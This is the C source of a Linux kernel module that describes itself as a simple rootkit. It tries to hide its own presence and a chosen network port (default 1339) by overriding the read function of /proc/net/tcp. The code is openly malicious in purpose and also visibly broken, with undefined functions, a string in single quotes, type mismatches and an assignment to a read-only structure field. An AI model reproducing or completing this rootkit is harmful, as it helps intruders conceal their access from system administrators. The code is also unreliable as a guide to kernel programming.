#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/file.h>
#include <linux/namei.h>

MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("Ahmed H. Ismail");
MODULE_DESCRIPTION("Simple rootkit that hides its presence and a port number");
unsigned short SR_PORT = 1339; // port number to be set
module_param(SR_PORT, unsigned short, 0);
MODULE_PARM_DESC(SR_PORT, "Port number to hide.");
static struct proc_dir_entry proc_root;
static struct inode tcp_d_inode;
static struct file_operations tcp_fops;

static void tcp_hide_helper() {
  struct path p;
  // get path
  if(!kern_path('/proc/net/tcp', 0, &p)) {
    // no error
    tcp_d_inode = p.dentry->d_inode;

  }

  if(tcp_d_inode) {
    // Override read function in inode to hide socket.
    tcp_fops = *tcp_d_inode->i_fop;
    tcp_d_inode->i_fop.read = read_tcp;
  }

}

static int __init rootkit_init() {
  struct file_operations fileops_struct;
  hide_mod_init_helper();
  struct proc_dir_entry dummy = proc_create("noob", 0644, 0, &fileops_struct);
  proc_root = dummy->parent;
  // Hide TCP hook
  tcp_hide_helper();


}

static void __exit rootkit_exit() {

}
module_init(rootkit_init);
module_exit(rootkit_exit);


